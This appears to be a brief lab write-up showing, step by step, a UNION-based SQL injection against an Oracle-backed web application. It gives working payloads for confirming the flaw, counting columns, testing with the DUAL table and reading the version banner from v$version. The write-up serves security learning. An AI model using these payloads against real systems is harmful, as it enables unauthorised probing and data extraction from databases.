# SQL-injection-attack-querying-the-database-type-and-version-on-Oracle

(1) To be sure that it has an sql vulnerability: url' -> internal server error. That means it has a vulnerability
(2) To know the number of column: 'ORDER BY 3-- -> internal server error. It means there are 2 columns
(3) To know which column is data retrieving: ‘UNION SELECT NULL,'Data'--. But got error. It is because the database is oracle 
(4) To know data retrieve in oracle database: 'UNION SELECT 'sajib','rajib' FROM DUAL--. See we find out 2 both 2 column are retrieving data
(5) To know the version of oracle database: 'UNION SELECT banner, banner FROM v$version--. Here two banner is for the 2 columns.
